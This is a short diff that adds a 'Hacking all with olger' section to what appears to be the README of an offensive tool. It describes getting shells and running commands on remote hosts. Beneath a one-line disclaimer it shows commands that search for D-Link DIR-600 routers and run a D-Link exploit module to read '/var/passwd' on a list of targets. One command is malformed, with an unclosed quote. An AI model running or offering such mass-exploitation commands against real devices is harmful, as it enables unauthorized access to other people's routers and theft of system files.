@@ -191,10 +191,15 @@ iphaproxy,domainname,http,ipbackend,portbackend,urlredirect
 
 ## Hacking all with olger
 
+Is just an example never do in real world
+Getting shells anywhere or execute commands in remote hosts.
+
 
 ```
 
+./olger -s "dir 600 v2.12"
 
+./olger -m exploits/dlink "" "cat /var/passwd" "lists/dir600v2.12
 
 
 ```
